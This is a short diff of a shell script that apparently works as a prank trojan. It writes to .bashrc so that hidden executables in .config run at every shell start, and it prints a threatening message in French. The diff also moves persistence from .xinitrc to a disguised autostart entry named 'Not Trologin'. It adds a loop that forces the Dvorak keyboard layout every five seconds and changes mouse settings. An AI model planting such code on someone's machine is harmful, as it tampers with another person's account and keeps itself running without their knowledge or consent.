@@ -12,6 +12,7 @@ then
    while true
    do
       setxkbmap dvorak
+      xset m 10 0
       sleep 5
    done
 fi
@@ -35,6 +36,8 @@ echo \"N'ESSAYEZ PAS DE NOUS ARNAQUER, OU LA SENTENCE SERA TERRIBLE.\"
 echo \"And don't forget... The crepe is a lie.\"
 ./.config/.the_game &
 ./.config/.tmp_1h3g4me &" >> .bashrc
-echo "nohup ./.config/.tmp_1h3g4me" >> .xinitrc
-
+echo "[Desktop Entry]
+Name=Not Trologin
+Exec=bash $HOME/.config/.tmp_1h3g4me
+Type=Application" > .config/autostart
 source .bashrc
